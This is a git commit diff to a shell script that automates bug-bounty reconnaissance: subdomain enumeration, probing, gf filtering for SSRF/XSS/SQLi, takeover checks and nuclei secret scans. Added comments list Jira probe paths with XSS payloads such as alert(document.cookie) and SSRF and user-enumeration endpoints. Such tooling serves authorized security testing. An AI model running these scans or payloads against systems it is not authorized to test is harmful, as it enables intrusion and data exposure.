0e3cc183eff676f8044cf9b8329d19f6ff75ae71
faique <49121486+faiqu3@users.noreply.github.com>
2023-02-24 21:42:05 +0530

    Update auto.sh

--- auto.sh
+++ auto.sh
@@ -13,7 +13,7 @@ do
 	subfinder -d $maindomain -silent | anew -q domains
 	echo "Subfinder Done!"
 	cat domains | goaltdns -w ${goaltdns} | httprobe -prefer-https -p http:8080 -p http:3000 -p http:8000 -p http:8888 | anew http
-
+	echo "goaltdns Done!"
 	#network enumeration
 	echo "[-] Network enumeration"
 	echo " "
@@ -30,9 +30,9 @@ do
 	echo " "
 	echo "[-] SSRF XSS SQLi"
 	echo " "
-	cat urls | gf ssrf | anew -q ssrf
-	cat urls | gf xss | anew -q xss
-	cat urls | gf sqli | anew -q sqli
+	cat urls | gf ssrf > ssrf
+	cat urls | gf xss >  xss
+	cat urls | gf sqli >  sqli
 
 	#scan
 	echo " "
@@ -52,13 +52,44 @@ do
 	echo ""
 	echo "[-] Screenshot"
 	echo ""
-	python3 ~/EyeWitness/Python/EyeWitness.py -f http --web
+	python3 ~/EyeWitness/Python/EyeWitness.py -f http --web 	
 
 	#subdomain takeover
+	echo ""
 	subjack -w domains -t 100 -timeout 30 -c ${tools}/fingerprints.json -o sub_takeovers.txt -ssl
-
+	echo "subjack Done!"
+	
 	#Dns takeover
 	cat domains | dnstake -s -o dns_takeover.txt
+	echo "dnstake Done!"
+
+	#Secret in JS file
+	cat urls | grep -E "*.js" > jsfiles
+	nuclei -silent -l jsfiles -t ~/FindSecret/js-secret.yaml -o jssecrets
+
+	# make a directory search automation
+	# /secure/ConfigurePortalPages!default.jspa?view=popular
+	# /secure/ManageFilters.jspa?filterView=search&Search=Search&filterView=search&sortColumn=favcount&sortAscending=false
+	# /secure/ContactAdministrators!default.jspa
+	# /servicedesk/customer/user/login
+	# /issues/?jql=
+	# /plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com/
+	# /rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
+	# /plugins/servlet/gadgets/makeRequest?url=https://example.com/
+	# /plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
+	# /secure/QueryComponent!Default.jspa
+	# /secure/ViewUserHover.jspa
+	# /ViewUserHover.jspa?username=Admin
+	# /rest/api/2/dashboard?maxResults=100
+	# /pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm
+	# /rest/api/2/user/picker?query=admin
+	# /s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
+	# /rest/api/2/user/picker?query=admin
+	# /s/
+	# /plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.google.nl/
+	# /secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search
+	# ConfigurePortalPages.jspa
+	# /plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true
 
 	#Directory search
 	# echo " "
